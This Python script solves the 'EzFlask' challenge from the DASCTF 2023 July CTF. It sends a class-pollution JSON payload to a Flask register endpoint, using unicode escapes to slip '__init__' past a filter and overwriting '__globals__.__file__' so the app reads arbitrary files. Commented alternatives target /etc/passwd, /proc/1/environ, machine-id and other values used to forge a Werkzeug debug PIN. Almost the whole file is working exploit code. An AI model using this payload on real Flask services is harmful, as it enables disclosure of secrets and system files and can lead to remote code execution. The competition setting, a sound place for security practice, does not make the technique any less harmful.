# DASCTF 2023 & 0X401七月暑期挑战赛 EzFlask
import json
import requests
import os

url = "http://127.0.0.1:5000"
url = "http://9afafed5-f2bb-4999-bb89-7466ea00e4d6.node4.buuoj.cn:81/"
payload = {
    "username": "admin",
    "password": "123456",
    r"\u005F\u005F\u0069\u006E\u0069\u0074\u005F\u005F": {
        "__globals__": {
            "__file__": "secret.py"
            # "__file__": "../../../../etc/passwd"
            # "__file__": "/usr/local/lib/python3.10/site-packages/flask/app.py"
            # "__file__": "../../../proc/1/environ"
            # "__file__": "/sys/class/net/eth0/address"
            # "__file__": "/etc/machine-id"
            # "__file__": "/proc/sys/kernel/random/boot_id"
            # "__file__": "/proc/self/cgroup"
        }
    }
}
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

payload = json.dumps(payload).replace(r'\\u', r'\u').replace('"', r'""')
# payload = json.dumps(payload).replace(r'\\u', r'\u').replace('"', r'\"') # 也可以
url2 = url + 'register'
command = r"""curl -X POST --location "%s" -H "Content-Type: application/json" -d "%s" """ % (
    url2, payload)
print(command)
os.system(command)
print()

res = requests.get(url)
print(res.text)
